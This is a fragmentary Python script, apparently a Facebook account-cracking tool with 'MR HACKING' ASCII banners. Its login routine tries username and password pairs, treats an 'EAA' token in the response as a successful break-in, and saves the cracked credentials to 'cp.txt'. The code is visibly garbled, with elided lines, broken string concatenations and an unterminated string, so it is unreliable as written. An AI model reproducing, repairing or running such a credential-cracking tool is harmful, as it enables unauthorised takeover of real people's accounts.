...
▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌▐░▌         
 ▀         ▀  ▀         ▀       ▀  ▀         ▀  ▀         
        ︻デ═一 HACKER : MR HACKING
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : MR HACKING
\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] TELEGRAM  
...
▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌▐░▌           
 ▀         ▀  ▀         ▀       ▀  ▀         ▀  ▀         
              ︻デ═一 HACKER : MR HACKING
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : MR HACKING
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : 
...
def moch_yayan():
    time.sleep(0.1)
    print("\033[97m [\033[96m01\033[97m] Start Crake ID with MOHAMMAD SOJIB")
    ...
    if yayan == "1" or yayan == "01":
        ...
        def login(username, password, sojib=sojib):
            global die, check, result, count
            ...
            if 'EAA' in response.text:
                ...
                check += 1
                if cek:
                    chek.append(username +mr password)
                else:
                    with open('cp.txt', 'a') as f:
                        f.write(username +mr+ password +n')
            else:
                die += 1
            for i in list('\|/-•'):
                print(
